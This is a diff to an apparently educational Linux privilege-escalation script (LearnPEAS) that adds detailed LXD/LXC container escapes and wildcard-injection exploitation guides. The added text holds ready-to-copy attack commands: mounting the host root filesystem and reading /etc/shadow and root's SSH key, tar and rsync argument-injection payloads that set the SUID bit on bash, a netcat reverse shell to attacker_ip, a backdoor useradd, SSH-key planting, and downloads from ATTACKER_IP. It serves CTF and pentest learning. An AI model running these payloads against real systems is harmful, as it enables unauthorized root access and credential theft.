+        teach "  • A way to trigger the vulnerability (input, files, network)"
+        teach "  • The vulnerability must lead to code execution"
     fi
 }
-
 # === INTERESTING FILES ===
 enum_interesting_files() {
     section "INTERESTING FILE DISCOVERY"
@@ -7151,24 +8969,216 @@ enum_tools() {
                         teach "    Any username listed can use Docker for root access. Try to escalate to one of these users."
                     fi
                     ;;
+# LXD/LXC exploitation with intelligent internet detection
                 lxd|lxc)
                     if groups | grep -qw "$tool"; then
                         critical "  ! $tool (and you are in $tool group: INSTANT root possible)"
-                        critical "        POTENTIAL INSTANT ROOT: Detailled overview available"
-                        warn "     Please note LXC might be blocked from connecting to the internet and might require"
-                        warn "     the attacker to import their own container image (more info coming soon). "
-                        teach "    First optain the container image: "
-                        teach "    lxc init ubuntu:18.04 privesc -c security.privileged=true"
-                        teach "    Next mount the host filesystem to it: "
-                        teach "    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
-                        teach "    Start the container: "
-                        teach "    lxc start privesc"
-                        teach "    Start a shell: "
-                        teach "    lxc exec privesc /bin/bash"
-                        teach "    cd /mnt/root/root"
+                        log ""
+                        
+                        # Check if LXD can access internet
+                        info "Checking if LXD has internet access..."
+                        local has_internet=0
+                        
+                        # Test 1: Try to resolve images.linuxcontainers.org (LXD's image server)
+                        if timeout 15 bash -c "exec 3<>/dev/tcp/images.linuxcontainers.org/443 2>/dev/null" 2>/dev/null; then
+                            has_internet=1
+                        # Test 2: Try to resolve ubuntu.com as fallback
+                        elif timeout 15 bash -c "exec 3<>/dev/tcp/ubuntu.com/80 2>/dev/null" 2>/dev/null; then
+                            has_internet=1
+                        # Test 3: Check if nslookup/dig work for DNS resolution
+                        elif command -v nslookup >/dev/null 2>&1 && timeout 15 nslookup images.linuxcontainers.org >/dev/null 2>&1; then
+                            has_internet=1
+                        elif command -v dig >/dev/null 2>&1 && timeout 15 dig +short images.linuxcontainers.org >/dev/null 2>&1; then
+                            has_internet=1
+                        fi
+                        
+                        if [ $has_internet -eq 1 ]; then
+                            ok "Internet access detected - using ONLINE method (download image directly)"
+                        else
+                            warn "No internet access detected - using OFFLINE method (manual image transfer)"
+                        fi
+                        log ""
+                        
+                        teach "    ╔═══════════════════════════════════════════════════════════╗"
+                        teach "    ║  LXD/LXC PRIVILEGE ESCALATION                             ║"
+                        teach "    ╚═══════════════════════════════════════════════════════════╝"
+                        teach ""
+                        
+                        if [ $has_internet -eq 1 ]; then
+                            # ONLINE METHOD
+                            teach "    ┌───────────────────────────────────────────────────────────┐"
+                            teach "    │ ONLINE METHOD: Download Image Directly                    │"
+                            teach "    └───────────────────────────────────────────────────────────┘"
+                        else
+                            # OFFLINE METHOD
+                            teach "    ┌───────────────────────────────────────────────────────────┐"
+                            teach "    │ OFFLINE METHOD: Manual Image Transfer Required            │"
+                            teach "    └───────────────────────────────────────────────────────────┘"
+                            warn "    ⚠  LXD cannot reach internet - must transfer image manually"
+                            warn "    ⚠  Common on CTF boxes"
+                        fi
+                        teach ""
+                        
+                        if [ $has_internet -eq 1 ]; then
+                            # ============ ONLINE METHOD ============
+                            teach "    Step 1 - Initialize privileged container with Ubuntu image:"
+                            teach "      lxc init ubuntu:18.04 privesc -c security.privileged=true"
+                            teach ""
+                            teach "    Step 2 - Mount host filesystem to container:"
+                            teach "      lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
+                            teach ""
+                            teach "    Step 3 - Start the container:"
+                            teach "      lxc start privesc"
+                            teach ""
+                            teach "    Step 4 - Execute shell inside container:"
+                            teach "      lxc exec privesc /bin/bash"
+                            teach ""
+                            teach "    Step 5 - Access host filesystem (you're root now):"
+                            teach "      cd /mnt/root/root"
+                            teach "      cat /mnt/root/etc/shadow  # Read host's shadow file"
+                            teach "      cat /mnt/root/root/root.txt  # Root flag (CTF)"
+                        else
+                            # ============ OFFLINE METHOD ============
+                            teach "    ═══ PHASE A: Build Alpine Image (On Attacker Machine) ═══"
+                            teach ""
+                            teach "    1. Install dependencies:"
+                            teach "       sudo apt update"
+                            teach "       sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools"
+                            teach ""
+                            teach "    2. Clone and build distrobuilder:"
+                            teach "       git clone https://github.com/lxc/distrobuilder"
+                            teach "       cd distrobuilder"
+                            teach "       make"
+                            teach ""
+                            teach "    3. Create build directory:"
+                            teach "       mkdir -p /tmp/alpine-build && cd /tmp/alpine-build"
+                            teach ""
+                            teach "    4. Download Alpine recipe:"
+                            teach "       wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml"
+                            teach ""
+                            teach "    5. Build minimal Alpine image:"
+                            teach "       sudo /path/to/distrobuilder/distrobuilder build-lxd alpine.yaml -o image.release=3.18"
+                            teach ""
+                            teach "       Output files created:"
+                            teach "       • lxd.tar.xz (metadata, ~1KB)"
+                            teach "       • rootfs.squashfs (filesystem, ~2-3MB)"
+                            teach ""
+                            teach "    ═══ PHASE B: Transfer to Target ═══"
+                            teach ""
+                            teach "    Option A - If wget/curl available on target:"
+                            teach "      # On attacker:"
+                            teach "      python3 -m http.server 8000"
+                            teach ""
+                            teach "      # On target:"
+                            teach "      cd /tmp"
+                            teach "      wget http://ATTACKER_IP:8000/lxd.tar.xz"
+                            teach "      wget http://ATTACKER_IP:8000/rootfs.squashfs"
+                            teach ""
+                            teach "    Option B - Base64 transfer (if no download tools):"
+                            teach "      # On attacker:"
+                            teach "      base64 lxd.tar.xz > lxd.b64"
+                            teach "      base64 rootfs.squashfs > rootfs.b64"
+                            teach ""
+                            teach "      # On target, paste base64 content:"
+                            teach "      cat > /tmp/lxd.b64 << 'EOF'"
+                            teach "      [paste lxd.b64 content here]"
+                            teach "      EOF"
+                            teach "      base64 -d /tmp/lxd.b64 > /tmp/lxd.tar.xz"
+                            teach ""
+                            teach "      cat > /tmp/rootfs.b64 << 'EOF'"
+                            teach "      [paste rootfs.b64 content here]"
+                            teach "      EOF"
+                            teach "      base64 -d /tmp/rootfs.b64 > /tmp/rootfs.squashfs"
+                            teach ""
+                            teach "    Option C - SCP transfer (if SSH available):"
+                            teach "      scp lxd.tar.xz rootfs.squashfs user@target:/tmp/"
+                            teach ""
+                            teach "    ═══ PHASE C: Import and Exploit on Target ═══"
+                            teach ""
+                            teach "    1. Import the custom Alpine image:"
+                            teach "       cd /tmp"
+                            teach "       lxc image import lxd.tar.xz rootfs.squashfs --alias alpine-privesc"
+                            teach ""
+                            teach "    2. Verify image imported successfully:"
+                            teach "       lxc image list"
+                            teach "       # Should show 'alpine-privesc' in output"
+                            teach ""
+                            teach "    3. Initialize privileged container:"
+                            teach "       lxc init alpine-privesc privesc -c security.privileged=true"
+                            teach ""
+                            teach "    4. Mount host filesystem:"
+                            teach "       lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
+                            teach ""
+                            teach "    5. Start container:"
+                            teach "       lxc start privesc"
+                            teach ""
+                            teach "    6. Get root shell:"
+                            teach "       lxc exec privesc /bin/sh"
+                            teach ""
+                            teach "    7. Access host filesystem (YOU ARE ROOT NOW):"
+                            teach "       cd /mnt/root"
+                            teach "       ls -la root/           # Host's /root directory"
+                            teach "       cat root/root.txt      # Root flag (CTF)"
+                            teach "       cat etc/shadow         # Host shadow file"
+                            teach "       cat root/.ssh/id_rsa   # Root's SSH key"
+                        fi
+                        teach "    ╔═══════════════════════════════════════════════════════════╗"
+                        teach "    ║  WHY THIS WORKS - The Security Model Flaw                 ║"
+                        teach "    ╚═══════════════════════════════════════════════════════════╝"
+                        teach ""
+                        teach "    LXD GROUP = ROOT EQUIVALENT:"
+                        teach "      • LXD daemon runs as root (needs to manage containers)"
+                        teach "      • Members of 'lxd' group can communicate with this daemon"
+                        teach "      • Can create 'privileged' containers (security.privileged=true)"
+                        teach ""
+                        teach "    PRIVILEGED CONTAINERS:"
+                        teach "      • Normal container: isolated, can't see host filesystem"
+                        teach "      • Privileged container: NO isolation, full host access"
+                        teach "      • UID 0 in container = UID 0 on host (root)"
+                        teach ""
+                        teach "    THE EXPLOIT CHAIN:"
+                        teach "      1. You're in 'lxd' group (non-root user)"
+                        teach "      2. Create privileged container (allowed by group)"
+                        teach "      3. Mount host's / to container's /mnt/root"
+                        teach "      4. Enter container as root (UID 0)"
+                        teach "      5. Access /mnt/root = host filesystem as root"
+                        teach "      6. Read /mnt/root/etc/shadow, modify files, game over"
+                        teach ""
+                        teach "    WHY ADMINS DO THIS:"
+                        teach "      • Think: 'User needs to manage their own containers'"
+                        teach "      • Don't realize: lxd group = instant root access"
+                        teach "      • Equivalent to giving user sudo ALL=(ALL) NOPASSWD: ALL"
+                        teach ""
+                        teach "    ╔═══════════════════════════════════════════════════════════╗"
+                        teach "    ║  TROUBLESHOOTING                                          ║"
+                        teach "    ╚═══════════════════════════════════════════════════════════╝"
+                        teach ""
+                        teach "    Issue: 'Error: Get ... dial tcp: lookup ... no such host'"
+                        teach "      → LXD can't reach internet, use OFFLINE method above"
+                        teach ""
+                        teach "    Issue: 'Error: not authorized'"
+                        teach "      → Your user not in lxd group yet, run: newgrp lxd"
+                        teach "      → Or logout and login again"
+                        teach ""
+                        teach "    Issue: 'Error: The image already exists'"
+                        teach "      → Image already imported, skip to step 3"
+                        teach "      → Or use different alias: --alias alpine-privesc2"
+                        teach ""
+                        teach "    Issue: Container starts but can't exec shell"
+                        teach "      → Try: lxc exec privesc /bin/sh (instead of bash)"
+                        teach "      → Alpine uses /bin/sh by default, not bash"
+                        teach ""
+                        teach "    Issue: Files in /mnt/root not accessible"
+                        teach "      → Check mount succeeded: lxc config device show privesc"
+                        teach "      → Verify privileged: lxc config show privesc | grep privileged"
+                        log ""
                     else
                         warn "  ! $tool (but you are NOT in $tool group)"
-                        teach "    You need to be in the $tool group for root-level access. Check: grep $tool /etc/group"
+                        teach "    You need to be in the $tool group for root-level access."
+                        teach "    Check which users have this privilege:"
+                        teach "      grep $tool /etc/group"
+                        teach ""
+                        teach "    Try to escalate to one of those users to gain instant root via LXD."
                     fi
                     ;;
                 podman)
@@ -7222,27 +9232,293 @@ enum_tools() {
 enum_wildcards() {
     section "WILDCARD INJECTION OPPORTUNITIES"
     
-    explain_concept "Wildcard Injection" \
-        "When scripts use wildcards (*, ?) with commands, specially named files can be interpreted as command arguments." \
-        "Shell expands wildcards before passing to command. If script does 'tar -czf backup.tar.gz *', files named '--checkpoint=1' become arguments to tar. Commands process arguments before files." \
-        "Common targets:\n  • tar with * → --checkpoint-action\n  • rsync with * → -e option\n  • chown with * → --reference\n  • Any command taking options starting with -"
+    # PHASE 1: SILENT SCAN - Collect exploitable findings
+    local temp_wildcards="/tmp/.learnpeas_wildcards_$$"
+    local found_exploitable=0
     
-    # Look for scripts using wildcards
-    find /var/scripts /usr/local/bin /opt -name "*.sh" -readable 2>/dev/null | while read script; do
-        if grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | grep -q "."; then
-            warn "Script uses wildcards: $script"
-            grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | while read line; do
-                log "  $line"
+    cleanup_wildcard_temps() {
+        rm -f "$temp_wildcards" 2>/dev/null
+    }
+    trap cleanup_wildcard_temps RETURN
+    
+    # Search for scripts with wildcards in common locations
+    find /var/scripts /usr/local/bin /opt /home /root 2>/dev/null -name "*.sh" -readable 2>/dev/null | while read script; do
+        # Skip if this is learnpeas/linpeas/teachpeas itself (avoid self-detection)
+        if echo "$script" | grep -qE "learnpeas|linpeas|teachpeas"; then
+            continue
+        fi
+        
+        # Check for dangerous wildcard usage
+        grep -nE "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*|cp.*\*|mv.*\*" "$script" 2>/dev/null | while IFS=: read line_num line_content; do
+            # Skip comments and educational content
+            if echo "$line_content" | grep -qE "^[[:space:]]*#|explain_concept|teach|\".*tar.*\*.*\"|'.*tar.*\*.*'"; then
+                continue
+            fi
+            # Determine the command being used
+            local cmd=""
+            if echo "$line_content" | grep -q "tar.*\*"; then
+                cmd="tar"
+            elif echo "$line_content" | grep -q "rsync.*\*"; then
+                cmd="rsync"
+            elif echo "$line_content" | grep -q "chown.*\*"; then
+                cmd="chown"
+            elif echo "$line_content" | grep -q "chmod.*\*"; then
+                cmd="chmod"
+            elif echo "$line_content" | grep -q "cp.*\*"; then
+                cmd="cp"
+            elif echo "$line_content" | grep -q "mv.*\*"; then
+                cmd="mv"
+            fi
+            
+            # Try to extract the directory path where wildcard expands
+            local target_dir=""
+            
+            # Look for explicit paths with wildcards: /some/path/*
+            if echo "$line_content" | grep -oE "['\"]?/[^'\"[:space:]]+/\*" >/dev/null; then
+                target_dir=$(echo "$line_content" | grep -oE "/[^'\"[:space:]]+/\*" | sed 's|/\*$||' | head -1)
+            # Look for relative paths: ./dir/* or dir/*
+            elif echo "$line_content" | grep -oE "\./[^'\"[:space:]]+/\*|[a-zA-Z0-9_-]+/\*" >/dev/null; then
+                local rel_path=$(echo "$line_content" | grep -oE "\./[^'\"[:space:]]+/\*|[a-zA-Z0-9_-]+/\*" | sed 's|/\*$||' | head -1 | sed 's|^\./||')
+                # Get script's directory
+                local script_dir=$(dirname "$script")
+                target_dir="$script_dir/$rel_path"
+            # Just bare * - expands in script's directory or current working dir
+            elif echo "$line_content" | grep -qE "[[:space:]]\*[[:space:]]|[[:space:]]\*$"; then
+                # Check if there's a cd command before this line
+                local cd_dir=$(head -n $line_num "$script" | tac | grep -m1 "^[[:space:]]*cd[[:space:]]" | awk '{print $2}' | tr -d \'\")
+                if [ -n "$cd_dir" ]; then
+                    # Resolve cd directory
+                    if [[ "$cd_dir" == /* ]]; then
+                        target_dir="$cd_dir"
+                    else
+                        target_dir="$(dirname "$script")/$cd_dir"
+                    fi
+                else
+                    # Assume script's directory
+                    target_dir=$(dirname "$script")
+                fi
+            fi
+            
+            # If we found a target directory, check if it's writable
+            if [ -n "$target_dir" ] && [ -d "$target_dir" ] && [ -w "$target_dir" ]; then
+                # This is exploitable!
+                echo "$script|$line_num|$cmd|$target_dir|$line_content" >> "$temp_wildcards"
+                found_exploitable=1
+            fi
+        done
+    done
+    
+    # PHASE 2: CONDITIONAL EDUCATION (only if exploitable vectors found)
+    if [ "$found_exploitable" -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  WILDCARD INJECTION - Understanding the Attack"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT IS WILDCARD INJECTION:"
+        teach "  When scripts use wildcards (* or ?) in commands, the shell"
+        teach "  expands them to filenames BEFORE passing to the command."
+        teach "  By creating files with names like '--checkpoint=1', those"
+        teach "  filenames become command-line arguments."
+        teach ""
+        teach "WHY IT WORKS:"
+        teach "  1. Script runs: tar -czf backup.tar.gz *"
+        teach "  2. Shell expands * to all files in directory"
+        teach "  3. If files named '--checkpoint=1' exist, they're expanded"
+        teach "  4. Command receives: tar -czf backup.tar.gz --checkpoint=1 file1 file2"
+        teach "  5. tar interprets --checkpoint=1 as an ARGUMENT, not a filename"
+        teach "  6. Attacker controls the arguments!"
+        teach ""
+        teach "REQUIREMENTS FOR EXPLOITATION:"
+        teach "  ✓ Script must use wildcards with vulnerable commands"
+        teach "  ✓ You must have WRITE access to the directory where * expands"
+        teach "  ✓ Script must run with higher privileges (root, via cron, etc.)"
+        teach ""
+        teach "COMMON VULNERABLE PATTERNS:"
+        teach "  • tar with * → --checkpoint-action=exec"
+        teach "  • rsync with * → -e option for command execution"
+        teach "  • chown with * → --reference to change ownership"
+        teach "  • chmod with * → --reference to change permissions"
+        log ""
+    fi
+    
+    # PHASE 3: REPORT SPECIFIC FINDINGS (grouped by command type)
+    if [ -s "$temp_wildcards" ]; then
+        # Group findings by command type
+        local commands_found=$(cut -d'|' -f3 "$temp_wildcards" | sort -u)
+        
+        for cmd in $commands_found; do
+            log ""
+            
+            # Show all findings for this command type first
+            grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | while IFS='|' read -r script_path line_num command target_dir line_content; do
+                critical "EXPLOITABLE WILDCARD INJECTION - $command command"
+                vuln "Script: $script_path (line $line_num)"
+                info "Writable directory: $target_dir"
+                info "Vulnerable line: $(echo "$line_content" | head -c 100)..."
             done
             
-            teach "Exploitation example for tar:"
-            teach "  echo '#!/bin/sh' > shell.sh"
-            teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
-            teach "  chmod +x shell.sh"
-            teach "  touch -- '--checkpoint=1'"
-            teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
-        fi
-    done
+            log ""
+            
+            # Show education ONCE per command type
+            case "$cmd" in
+                tar)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  TAR WILDCARD EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "HOW TAR CHECKPOINT WORKS:"
+                    teach "  tar has --checkpoint option to run actions during archive"
+                    teach "  creation. --checkpoint-action=exec=COMMAND runs arbitrary code."
+                    teach ""
+                    teach "EXPLOITATION (Ready to copy):"
+                    teach ""
+                    teach "  # Step 1: Go to the writable directory"
+                    teach "  cd $target_dir"
+                    teach ""
+                    teach "  # Step 2: Create payload script"
+                    teach "  echo '#!/bin/bash' > shell.sh"
+                    teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
+                    teach "  chmod +x shell.sh"
+                    teach ""
+                    teach "  # Step 3: Create malicious filenames"
+                    teach "  touch -- '--checkpoint=1'"
+                    teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
+                    teach ""
+                    teach "  # Step 4: Wait for script to run (check cron)"
+                    teach "  # When tar runs, it will execute shell.sh as root"
+                    teach ""
+                    teach "  # Step 5: Get root shell"
+                    teach "  /bin/bash -p"
+                    teach ""
+                    teach "ALTERNATIVE PAYLOADS:"
+                    teach "  • Reverse shell: echo 'nc -e /bin/bash attacker_ip 4444' > shell.sh"
+                    teach "  • Add user: echo 'useradd -m -p \$(openssl passwd -1 password) hacker' > shell.sh"
+                    teach "  • SSH key: echo 'mkdir /root/.ssh; echo \"your_key\" > /root/.ssh/authorized_keys' > shell.sh"
+                    log ""
+                    ;;
+                    
+                rsync)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  RSYNC WILDCARD EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "HOW RSYNC -e WORKS:"
+                    teach "  rsync's -e option specifies remote shell to use."
+                    teach "  We can inject -e to execute arbitrary commands."
+                    teach ""
+                    teach "EXPLOITATION (Ready to copy):"
+                    teach ""
+                    teach "  # Step 1: Go to the writable directory"
+                    teach "  cd $target_dir"
+                    teach ""
+                    teach "  # Step 2: Create payload"
+                    teach "  echo '#!/bin/bash' > payload.sh"
+                    teach "  echo 'chmod u+s /bin/bash' >> payload.sh"
+                    teach "  chmod +x payload.sh"
+                    teach ""
+                    teach "  # Step 3: Create malicious filename"
+                    teach "  touch -- '-e sh payload.sh'"
+                    teach ""
+                    teach "  # Step 4: Wait for rsync to run"
+                    teach "  # rsync will execute: rsync -e sh payload.sh [other files]"
+                    teach ""
+                    teach "  # Step 5: Get root shell"
+                    teach "  /bin/bash -p"
+                    log ""
+                    ;;
+                    
+                chown)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  CHOWN WILDCARD EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "HOW CHOWN --reference WORKS:"
+                    teach "  chown --reference=FILE will copy ownership from FILE."
+                    teach "  We can make chown copy ownership from a file we control."
+                    teach ""
+                    teach "EXPLOITATION (Ready to copy):"
+                    teach ""
+                    teach "  # Step 1: Go to the writable directory"
+                    teach "  cd $target_dir"
+                    teach ""
+                    teach "  # Step 2: Create reference file owned by you"
+                    teach "  touch reference_file"
+                    teach ""
+                    teach "  # Step 3: Create malicious filename"
+                    teach "  touch -- '--reference=reference_file'"
+                    teach ""
+                    teach "  # Step 4: Wait for script to run"
+                    teach "  # chown will change ownership of all files to match reference_file"
+                    teach "  # This means files that were root-owned become YOUR files"
+                    teach ""
+                    teach "IMPACT:"
+                    teach "  You can gain ownership of sensitive files in that directory."
+                    teach "  Modify scripts, configs, or binaries that run as root."
+                    log ""
+                    ;;
+                    
+                chmod)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  CHMOD WILDCARD EXPLOITATION"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "HOW CHMOD --reference WORKS:"
+                    teach "  chmod --reference=FILE copies permissions from FILE."
+                    teach ""
+                    teach "EXPLOITATION (Ready to copy):"
+                    teach ""
+                    teach "  # Step 1: Go to the writable directory"
+                    teach "  cd $target_dir"
+                    teach ""
+                    teach "  # Step 2: Create reference file with desired perms"
+                    teach "  touch reference_file"
+                    teach "  chmod 777 reference_file"
+                    teach ""
+                    teach "  # Step 3: Create malicious filename"
+                    teach "  touch -- '--reference=reference_file'"
+                    teach ""
+                    teach "  # Step 4: Wait for script to run"
+                    teach "  # All files will become world-writable (777)"
+                    teach "  # You can now modify previously protected files"
+                    log ""
+                    ;;
+                    
+                *)
+                    teach "GENERIC WILDCARD EXPLOITATION:"
+                    teach "  Research command-specific injection techniques for: $command"
+                    teach "  Look for options that:"
+                    teach "  • Execute commands (-e, --exec, etc.)"
+                    teach "  • Read from files (--from-file, --reference)"
+                    teach "  • Change behavior in exploitable ways"
+                    log ""
+                    ;;
+            esac
+# Verification commands for the user to run
+            teach "VERIFICATION TIPS:"
+            teach "  • Check if scripts run via cron (check each vulnerable script)"
+            teach "  • Check script ownership and permissions"
+            teach "  • Monitor writable directories for changes"
+            teach ""
+            teach "Commands to run:"
+            local first_script=$(grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | head -1 | cut -d'|' -f1)
+            local first_dir=$(grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | head -1 | cut -d'|' -f4)
+            if [ -n "$first_script" ]; then
+                teach "  grep -r \"$(basename "$first_script")\" /etc/cron*"
+                teach "  ls -l \"$first_script\""
+            fi
+            if [ -n "$first_dir" ]; then
+                teach "  ls -la \"$first_dir\""
+            fi
+            log ""
+            
+        done < "$temp_wildcards"
+    fi
+    
+    # PHASE 4: CLEAN SUMMARY
+    if [ "$found_exploitable" -eq 0 ]; then
+        ok "No exploitable wildcard injection opportunities detected"
+    fi
 }
 # === WRITABLE LD.SO.PRELOAD ===
 enum_ld_preload() {
@@ -7281,43 +9557,6 @@ enum_ld_preload() {
             vuln "/etc/ld.so.conf.d/ is WRITABLE!"
             teach "Create config file pointing to your malicious library directory"
             teach "  echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig"
-        fi
-    fi
-}
-
-# === SYSTEMD TIMERS ===
-enum_systemd_timers() {
-    section "SYSTEMD TIMER ANALYSIS"
-    
-    explain_concept "Systemd Timers" \
-        "Systemd timers are the modern replacement for cron jobs. Like services, writable timer files running as root give you code execution." \
-        "Timers trigger service execution on a schedule. If you can modify a timer or its associated service that runs as root, you control what executes and when." \
-        "Exploitation:\n  1. Find writable timer: /etc/systemd/system/*.timer\n  2. Modify associated service's ExecStart\n  3. Or modify timer's OnCalendar to trigger immediately\n  4. systemctl daemon-reload && systemctl start timer-name"
-    
-    # Check for writable timer files
-    find /etc/systemd/system /lib/systemd/system -name "*.timer" -type f 2>/dev/null | while read timer; do
-        if [ -w "$timer" ] && [ ! -L "$timer" ]; then
-            critical "Writable systemd timer: $timer"
-            vuln "Writable systemd timer: $timer"
-            
-            # Find associated service
-            local service=$(grep "Unit=" "$timer" 2>/dev/null | cut -d= -f2)
-            if [ -n "$service" ]; then
-                info "  Associated service: $service"
-                if [ -w "/etc/systemd/system/$service" ] || [ -w "/lib/systemd/system/$service" ]; then
-                    critical "  Associated service is ALSO writable!"
-                fi
-            fi
-        fi
-    done
-    
-    # List active timers
-    if command -v systemctl >/dev/null 2>&1; then
-        local timer_count=$(systemctl list-timers --no-pager 2>/dev/null | grep -c "\.timer")
-        if [ $timer_count -gt 0 ]; then
-            info "Active timers: $timer_count"
-            teach "List all timers: systemctl list-timers"
-            teach "Check timer details: systemctl cat <timer-name>"
         fi
     fi
 }
@@ -7659,8 +9898,8 @@ EOF
     echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
     cat << "EOF"
     
-              Educational Privilege Escalation Tool - Version 1.5.0
-    
+              Educational Privilege Escalation Tool - Version 1.8.0
+                              Made by Wiz-Works
     ════════════════════════════════════════════════════════════════
 
 EOF
@@ -7709,7 +9948,6 @@ EOF
     # Service-based vectors
     enum_cron
     enum_systemd
-    enum_systemd_timers
     
     # Kernel & container
     enum_kernel
